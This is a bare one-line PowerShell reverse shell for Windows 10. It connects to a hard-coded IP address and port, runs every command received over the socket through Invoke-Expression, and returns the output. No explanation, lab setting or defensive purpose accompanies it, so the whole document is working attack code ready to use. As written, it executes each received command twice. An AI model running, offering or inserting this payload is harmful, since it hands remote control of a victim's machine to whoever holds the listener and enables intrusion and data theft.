# Minimal Reverse Shell (Windows 10)
$ip="10.162.6.102"; $port=33008; $s=new-object System.Net.Sockets.TcpClient($ip,$port); $st=$s.GetStream(); [byte[]]$b=0..65535|%{0}; while(($i=$st.Read($b,0,$b.Length)) -ne 0){$d=[text.encoding]::ASCII.GetString($b,0,$i);$st.Write([text.encoding]::ASCII.GetBytes((iex $d 2>&1|out-string)),0,(iex $d 2>&1|out-string).length)}
